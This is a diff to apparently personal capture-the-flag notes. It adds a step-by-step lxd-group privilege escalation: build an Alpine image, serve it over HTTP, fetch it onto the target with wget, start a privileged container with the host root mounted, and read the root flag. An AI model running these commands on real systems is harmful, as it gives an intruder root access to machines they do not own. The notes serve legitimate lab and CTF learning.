@@ -75,3 +75,21 @@ find / -perm -4000 -type f 2>/dev/null
 # Capabilities
 getcap -r / 2>/dev/null
 ```
+
+## We are par of the group lxd we can build an a alpine image and upload it to the target and get root 
+```bash
+git clone https://github.com/saghul/lxd-alpine-builder
+cd lxd-alpine-builder
+sudo ./build-alpine
+python3 -m http.server 80
+# In the target 
+wget http://ip/alpine-v3.13-x86_64-20210218_0139.tar.gz
+# Add the image
+lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz
+lxc init cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a7892b ignite -c security.privileged=true
+lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+lxc start ignite
+lxc exec ignite /bin/sh
+# Grab the flag
+cat /mnt/root/root/root.txt
+```
